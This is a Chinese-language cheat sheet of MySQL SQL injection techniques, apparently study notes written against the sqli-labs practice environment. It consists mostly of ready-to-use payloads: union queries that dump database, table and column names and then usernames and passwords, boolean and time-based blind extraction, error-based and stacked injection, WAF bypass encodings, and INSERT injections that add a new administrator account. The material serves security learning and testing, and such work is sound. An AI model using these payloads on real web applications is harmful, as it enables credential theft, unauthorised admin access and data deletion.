# Mysql

五种注入

- 布尔型盲注：根据返回页面判断条件真假
- 时间型盲注：用页面返回时间是否增加判断是否存在注入
- 基于错误的注入：页面会返回错误信息
- 联合查询注入：可以使用union的情况下
- 堆查询注入：可以同时执行多条语句

同时，也有可能在UA处 Referer处 Cookie处存在注入

# 使其报错

- 英文单引号
- 英文双引号

# 万能密码测试

- ' or 1=1#

# 判断语句

- or 1=1--+
- 'or 1=1--+
- "or 1=1--+
- )or 1=1--+
- ')or 1=1--+
- ") or 1=1--+
- "))or 1=1--+

此处的`--`为注释，+为占位，也可以通过%20(空格的URL编码)来替代，因为地址栏空格不会进入mysql语句，或者可以直接用%23（#）进行注释

# Information_schema

## 三个常用表

### Schemata

SCHEMA_NAME:数据库名

### tables

TABLE_SCHEMA:数据库名

TABLE_NAME:表名

### columns

TABLE_SCHEMA:数据库名

TABLE_NAME:表名

COLUMN_NAME:字段名

## 爆数据库(schemata)

```sql
http://192.168.154.131/sqli/Less-1/?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+
```

数据库名.表名：information_schema.schemata

## 爆表名(tables)

```sql
http://192.168.154.131/sqli/Less-1/index.php?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
```

where 之后的条件用来筛选选中的数据库

table_schema为数据库名

table_name为表名

## 爆字段(columns)

```sql
http://192.168.154.131/sqli/Less-1/index.php?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
```

## 爆数据

由上面的处理已知存在数据表users,users下有username和password两个字段

所以可以构造语句

```sql
http://192.168.154.131/sqli/Less-1/index.php?id=-1' union select 1,group_concat(username),group_concat(password) from users--+
```

查询所有结果或者通过id来查询指定的结果

```sql
http://192.168.154.131/sqli/Less-1/index.php?id=-1' union select 1,username,password from users where id=2--+
```

# 常用函数

group_concat(schema_name)可以查出所有的数据库名

# 盲注

盲注为不会把查询结果返回到前端的注入

## 爆数据库名长度

数据库名security八位，到>=9的时候会错误，此为Bool盲注

```sql
http://192.168.154.131/sqli/Less-5/index.php?id=2' and length(database())>=8 %23
```

确定数据库名长度为八位

## 逐位爆数据库

```sql
http://192.168.154.131/sqli/Less-5/index.php?id=2' and substr(database(),1,1)='s' %23
```

`substr`函数为截取字符串，从第一个字符开始，只返回一个

此步骤比较繁琐，建议使用工具，比如BurpSuite

或者可以采用ascii码猜解

```sql
and ord(substr(database(),1,1))=115
```

## 逐位爆表名

```sql
http://192.168.154.131/sqli/Less-5/index.php?id=2' and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e' %23
```

limit为从第0位开始，查询第一位，也就是第一个表名

## 逐位爆列名

```sql
http://192.168.154.131/sqli/Less-5/index.php?id=2' and substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='i' %23
```

## 爆数据同理

```sql
http://192.168.154.131/sqli/Less-5/index.php?id=2' and substr((select username from security.users where id='1' limit 0,1),1,1)='d' %23
```

# 报错注入

```sql
' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```

有时可能需要将'去掉'

# 延时盲注

### 时间型盲注 [#](https://wiki.wgpsec.org/knowledge/web/sql-injection.html#时间型盲注)

盲注是在SQL注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在SQL注入的方式 。

可以用`benchmark`，`sleep`等造成延时效果的函数。

如果`benkchmark`和`sleep`关键字被过滤了，可以让两个非常大的数据表做[笛卡尔积 (opens new window)](https://blog.csdn.net/qq_32763643/article/details/79187931)产生大量的计算从而产生时间延迟；例如使用[`heavy query` (opens new window)](https://www.anquanke.com/post/id/104319)进行延时注入

或者利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟。

**1、利用sleep判断数据库名长度**

```sql
' and sleep(5) and 1=1--+    页面返回不正常，延时5秒
' and sleep(5) and 1=2--+    页面返回不正常，不延时

and if(length(database())>1,sleep(5),1)
--if(条件表达式，真，假) --C语言的三目运算符类似
```

**2.取数据库名**

```sql
and if(substr(database(),1,1)='a',sleep(5),1)--+
```

### 时间型盲注的加速方式 [#](https://wiki.wgpsec.org/knowledge/web/sql-injection.html#时间型盲注的加速方式)

**1、Windows平台上的Mysql可以用DNSlog加速注入**

**2、利用二分查找法**

sqlmap盲注默认采用的是二分查找法

> - 利用 ASCII 码作为条件来查询，ASCII 码中字母范围在65~122之间
> - 以这个范围的中间数为条件，判断payload中传入的 ASCII 码是否大于这个中间数
> - 如果大于，就往中间数122这块查找。反之亦然

# 堆叠注入

  在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。

```
1;show tables()#
```

```
show columns from `table;--+
```

# 二次注入

有的时候在写入的时候，恶意字符被转义，正常进入数据库保存

```sql
INSERT INTO wp_users VALUES(2,'admin\'or\'1')
```

数据库保存的内容为

```
admin 'or' 1
```

当用需要SELECT这条语句的地方就会触发

```sql
SELECT * FROM wp_users WHERE username='admin'or'1';
```



# Waf绕过

## 空格过滤

可以使用`/**/`来代替空格

1. ${IFS}替换
2. $IFS$1替换
3. ${IFS替换
4. %20替换
5. <和<>重定向符替换
6. %09,%0a,%0b,%0c,%0d,%a0替换

## 将关键词替换为空

双写关键词`selselectect`

## 大小写绕过

selEct -- oR

## 十六进制绕过

select -- selec\x74

## 双重url编码绕过

or ---  %25%36%66%25%37%32

## 正则匹配select

```
set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;#
```

或者

```
/*!50000select*/
```

## 过滤引号

可以用`\`使引号逃逸

如果有

```php
$sql = "SELECT * FROM wp_news WHERE id = 'a' AND title = 'haha'"
```

可以构造

```php
$sql = "SELECT * FROM wp_news WHERE id = 'a\' AND title = 'OR sleep(1)'"
```

后面的title处的语句就可以逃逸，成功执行

## addslashes

这个函数开启会转义特殊字符

可以通过编码绕过，比如base64,urldecode进行转移，这个时候参数处于编码状态，无法被转义

# 一些可控点

- 上传文件的文件名
- http header

# 注入点

## SELECT

```SQL
SELECT select_expr FROM table_references 
```

### 注入点在select_expr

```sql
SELECT $_GET['id'],content FROM wp_news
```

可以调用

```
test.php?id=(select pwd from users) as title
```

或者盲注

### 注入点在table_reference

```sql
SELECT title,content FROM $_GET['table']
```

我们可以使用

```sql
SELECT title,content FROM (SELECT pwd as title FROM wp_user)
```

### 注入点在WHERE或者HAVING后

```sql
SELECT title FROM wp_news WHERE id=$_GET['id']
```

基本注入方法

### 注入点在GROUP BY 或ORDER BY 后

```sql
SELECT title FROM wp_news GROUP BY $_GET['title']
```

经过测试

```
title=id desc,(if(1,sleep(1),1))
```

会延迟一秒，可以延迟注入

### 注入点在LIMIT后

使用UNION注入，PROCEDURE注入(Mysql<5.6)或者基于时间的注入

## INSERT

```SQL
INSERT INTO tbl_name VALUES()
```

### 注入点位于tbl_name

```sql
INSERT INTO $_GET['table'] VALUES (2,2,2,2)
```

可以直接控制表名插入新管理员

```
?table=wp_user values(2,'newadmin','newadmin') %23
```

### 注入点位于VALUES

```sql
INSERT INTO wp_user VALUES (2,2,'username','1')
```

如果后面对应的是管理员标识，闭合单引号和括号，即可多添加一条语句

```
?is_admin=1'),(2,2,'admin','0') %23
```



即可插入一个新的管理员

```sql
INSERT INTO wp_user VALUES (2,2,'username','1'),(2,2,'admin','0')
```

或者在新闻添加等位置插入查询语句

```
INSERT INTO wp_user VALUES (2,2,'username','SELECT pwd FROM wp_user LIMIT 1')
```

然后在对应输出的地方就可以看到查询的pwd

## UPDATE

```sql
UPDATE wp_user SET id=2 WHERE user = '23'
```

如果id可控，即可修改多个字段内容，甚至user也是可控的

## DELETE

```sql
DELETE FROM wp_news WHERE id=$_GET['ID']
```

为了保证不影响正常数据，通常使用'AND SLEEP(1)保证为FALSE,后续就是时间盲注
